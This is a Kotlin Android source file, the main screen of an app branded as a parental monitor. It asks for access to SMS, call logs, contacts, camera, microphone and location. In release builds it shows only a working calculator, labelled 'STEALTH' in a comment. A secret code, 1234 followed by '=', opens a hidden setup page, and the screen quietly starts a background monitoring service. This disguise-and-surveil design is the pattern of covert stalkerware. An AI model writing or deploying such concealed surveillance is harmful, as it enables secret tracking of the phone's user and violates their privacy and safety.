package com.redeye.parentalmonitor.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.BuildConfig

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.CAMERA,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "All permissions granted")
            if (!hasBackgroundLocation()) {
                Toast.makeText(this, getString(R.string.setup_bg_request), Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
            }
            
            // RELEASE mode: Auto-start service after permissions granted
            if (!BuildConfig.DEBUG && preferencesManager.isConfigured() && preferencesManager.userConsentedMonitoring && !preferencesManager.userDisabledMonitoring && hasBackgroundLocation()) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "🚀 Starting monitoring service after permissions...")
                if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
                    try {
                        startMonitoringService()
                        preferencesManager.isMonitoringEnabled = true
                        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Service started successfully!")
                        Toast.makeText(this, getString(R.string.msg_monitoring_started), Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}")
                    }
                }
            }
            
        } else {
            android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
            Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
        
        try { PreferencesManager.refreshInstance(this) } catch (_: Exception) { }
        preferencesManager = PreferencesManager.getInstance(this)

        if (!BuildConfig.DEBUG) {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering RELEASE mode - CALCULATOR UI")
            setContentView(R.layout.activity_calculator)
            initCalculator()
            startMonitoringInBackground()
            return
        }

        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
        setContentView(R.layout.activity_calculator)
        initCalculator()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════
    
    private var calculatorDisplay: android.widget.TextView? = null
    private var calculatorHistory: android.widget.TextView? = null
    private var currentNumber = ""
    private var operator = ""
    private var previousNumber = ""
    private var lastExpression = ""
    private var justCalculated = false
    
    private fun initCalculator() {
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        calculatorHistory = findViewById(R.id.calculatorHistory)
        calculatorDisplay?.let {
            try {
                androidx.core.widget.TextViewCompat.setAutoSizeTextTypeUniformWithConfiguration(
                    it, 24, 56, 2, android.util.TypedValue.COMPLEX_UNIT_SP
                )
            } catch (_: Exception) {
            }
        }
        
        // Number buttons
        val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
        digitViews.forEachIndexed { index, viewId ->
            findViewById<android.widget.Button>(viewId).setOnClickListener { appendNumber(index.toString()) }
        }
        findViewById<android.widget.Button>(R.id.btnDot).setOnClickListener { appendNumber(".") }
        
        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus).setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus).setOnClickListener { setOperator("−") }
        findViewById<android.widget.Button>(R.id.btnMultiply).setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide).setOnClickListener { setOperator("÷") }
        
        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals).setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear).setOnClickListener { clear() }
        
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
    }
    
    private fun appendNumber(number: String) {
        if (justCalculated) {
            currentNumber = ""
            lastExpression = ""
            justCalculated = false
        }
        if (currentNumber == "Error") {
            currentNumber = ""
            previousNumber = ""
            operator = ""
        }
        if (number == ".") {
            if (currentNumber.contains(".")) return
            if (currentNumber.isEmpty()) {
                currentNumber = "0."
            } else {
                currentNumber += "."
            }
        } else if (currentNumber == "0") {
            currentNumber = number
        } else {
            if (currentNumber.count { it.isDigit() } >= 12) return
            currentNumber += number
        }

        updateCalculatorDisplay()
    }
    
    private fun setOperator(op: String) {
        justCalculated = false
        if (currentNumber.isEmpty() || currentNumber == "Error") return
        if (previousNumber.isNotEmpty()) {
            calculate()
            if (currentNumber == "Error" || currentNumber.isEmpty()) return
        }
        operator = op
        previousNumber = currentNumber
        currentNumber = ""
        updateCalculatorDisplay()
    }
    
    private fun calculate() {
        if (currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty() && !justCalculated) {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            currentNumber = ""
            previousNumber = ""
            operator = ""
            lastExpression = ""
            justCalculated = false
            updateCalculatorDisplay()
            openSetupPage()
            return
        }
        
        if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
        
        val currentStr = currentNumber
        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentStr.toDoubleOrNull() ?: return
        
        val result = when (operator) {
            "+" -> num1 + num2
            "−" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
            else -> num2
        }

        currentNumber = formatResult(result)

        lastExpression = "$previousNumber $operator $currentStr ="
        justCalculated = true
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }
    
    private fun formatResult(result: Double): String {
        if (result.isNaN() || result.isInfinite()) return "Error"
        val abs = kotlin.math.abs(result)
        if (result == kotlin.math.floor(result) && abs < 1e12) {
            return result.toLong().toString()
        }
        val floored = kotlin.math.floor(abs)
        val intDigits = if (floored < 1.0) 1 else kotlin.math.log10(floored).toInt() + 1
        if (intDigits > 12) {
            return String.format(java.util.Locale.US, "%.8E", result)
        }
        val maxScale = (12 - intDigits).coerceIn(0, 8)
        val plain = java.math.BigDecimal.valueOf(result)
            .setScale(maxScale, java.math.RoundingMode.HALF_UP)
            .stripTrailingZeros()
            .toPlainString()
        if (plain.count { it.isDigit() } > 12) {
            return String.format(java.util.Locale.US, "%.8E", result)
        }
        return plain
    }

    private fun clear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        lastExpression = ""
        justCalculated = false
        updateCalculatorDisplay()
    }

    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = when {
            currentNumber.isNotEmpty() -> currentNumber.replace("-", "−")
            previousNumber.isNotEmpty() -> previousNumber.replace("-", "−")
            else -> "0"
        }
        calculatorHistory?.text = when {
            justCalculated -> lastExpression
            operator.isNotEmpty() -> "${previousNumber.replace("-", "−")} $operator"
            else -> ""
        }
    }
    
    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java))
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to open setup", e)
            Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
        }
    }

    private fun startMonitoringInBackground() {
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
        
        // Check if already configured and has permissions
        if (!preferencesManager.isConfigured()) {
            android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
            return
        }
        
        // Silently request permissions if needed
        if (!hasAllPermissions()) {
            android.util.Log.w("MainActivity", "Permissions missing - waiting for Setup")
            return
        }
        
        // Start monitoring service silently
        if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
            return
        }
        if (!hasBackgroundLocation()) {
            android.util.Log.w("MainActivity", "Background location missing - waiting for Setup")
            return
        }
        if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
            try {
                startMonitoringService()
                preferencesManager.isMonitoringEnabled = true
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
            }
        } else {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
        }
    }
    
    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun startMonitoringService() {
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }

        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as foreground service")
            } else {
                startService(intent)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as regular service")
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

}
